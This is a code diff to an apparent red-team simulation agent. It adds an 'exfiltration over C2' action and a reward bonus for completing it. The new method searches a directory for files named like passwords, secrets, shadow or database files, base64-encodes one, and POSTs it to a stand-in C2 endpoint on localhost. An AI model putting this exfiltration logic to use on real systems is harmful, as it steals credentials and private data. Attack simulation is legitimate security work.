@@ -188,6 +188,40 @@ class RedTeamer:
             return {"impact": 10, "status": "wiped"}
         return {"impact": 0}
 
+    def t1041_exfiltration(self):
+        # Exfiltration over C2 Channel
+        target_dir = self._get_target_dir()
+        loot = []
+        try:
+            with os.scandir(target_dir) as it:
+                for entry in it:
+                    if entry.is_file():
+                        # Look for high value targets
+                        if any(kw in entry.name.lower() for kw in ['pass', 'secret', 'config', 'shadow', 'db']):
+                            loot.append(entry.path)
+
+            if not loot: return {"impact": 0, "status": "no_loot"}
+
+            target = random.choice(loot)
+            data = utils.safe_file_read(target, binary=True)
+
+            # Send to C2
+            import urllib.request
+            # Basic obfuscation/encoding could happen here
+            import base64
+            encoded_data = base64.b64encode(data).decode('utf-8')
+
+            post_body = f"type=EXFIL&file={os.path.basename(target)}&data={encoded_data}".encode('utf-8')
+            req = urllib.request.Request("http://localhost:8080/exfil", data=post_body, method='POST')
+
+            with urllib.request.urlopen(req, timeout=1) as f:
+                 resp = f.read()
+
+            return {"impact": 9, "file": os.path.basename(target), "status": "exfiltrated"}
+
+        except Exception as e:
+            return {"impact": 0, "status": "failed", "error": str(e)}
+
     def t1589_lurk(self):
         return {"impact": 0, "status": "lurking"}
 
@@ -207,7 +241,7 @@ class RedTeamer:
             try:
                 self.iteration_count += 1
                 self.update_heartbeat()
-                
+
                 # Perceive
                 war_state = self.state_manager.get_war_state()
                 current_alert = war_state.get('blue_alert_level', 1)
@@ -243,6 +277,8 @@ class RedTeamer:
                 reward = impact
                 if action_name == "T1021_LATERAL_MOVE" and result.get("status") == "escalated":
                     reward += config.RED["REWARDS"]["LATERAL_SUCCESS"]
+                if action_name == "T1041_EXFILTRATION" and result.get("status") == "exfiltrated":
+                     reward += config.RED["REWARDS"]["EXFIL_SUCCESS"]
                 if self.access_level == "CORE" and impact > 0:
                     reward += config.RED["REWARDS"]["CRITICAL"]
 
